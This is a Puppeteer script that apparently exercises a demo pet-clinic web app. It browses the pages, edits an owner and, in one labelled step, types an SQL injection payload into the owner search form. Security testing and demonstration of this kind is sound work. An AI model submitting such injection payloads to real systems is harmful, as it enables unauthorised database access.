const puppeteer = require('puppeteer');

(async () => {
  if (!process.env.BASEURL) {
      console.log('Please specify a base url. E.g. `BASEURL=http://example.org node exercise.js`');
  } else {
    var browser;
    
    if (process.env.DEBUG) {
      browser = await puppeteer.launch({
          headless: false, 
          executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
      });
    } else {
      browser = await puppeteer.launch();
    }

    const sqliPayload = "D' OR '1%'='1"
    
    //home page

    console.log('visiting home page')
    const page = await browser.newPage()
    await page.goto(process.env.BASEURL)
    await page.waitFor(2000)

    //exercising sqli vulnerability
    console.log('exercising sqli vulnerability')
    const page2 = await browser.newPage()
    await page2.goto(process.env.BASEURL + '/owners/find')
    await page2.waitFor(2000)
    await page2.focus('#lastName.form-control')
    await page2.keyboard.type('Davis');
    await page2.waitFor(2000)
    await page2.click('button.btn.btn-default')
    await page2.waitFor(2000)

    //attacking sqli vulnerability

    console.log('attacking sqli vulnerability')
    const page3 = await browser.newPage()
    await page3.goto(process.env.BASEURL + '/owners/find')
    await page3.waitFor(2000)
    await page3.focus('#lastName.form-control')
    await page3.keyboard.type(sqliPayload);
    await page3.waitFor(2000)
    await page3.click('button.btn.btn-default')
    await page3.waitFor(2000)

    //vets
    console.log('visiting vets')
    const page4 = await browser.newPage()
    await page4.goto(process.env.BASEURL + '/vets.html')
    await page4.waitFor(2000)

    //owners
    console.log('visiting owners')
    const page5 = await browser.newPage()
    await page5.goto(process.env.BASEURL + '/owners')
    await page5.waitFor(2000)

    // edit owner

    console.log('editing an owner')
    const page6 = await browser.newPage()
    await page6.goto(process.env.BASEURL + '/owners/1/edit')
    await page6.waitFor(2000)
    await page6.evaluate( () => document.getElementById("firstName").value = "David")
    await page6.waitFor(2000)
    await page6.click('button.btn.btn-default')
    await page6.waitFor(2000)



    browser.close()
    console.log('End')
  }
})()
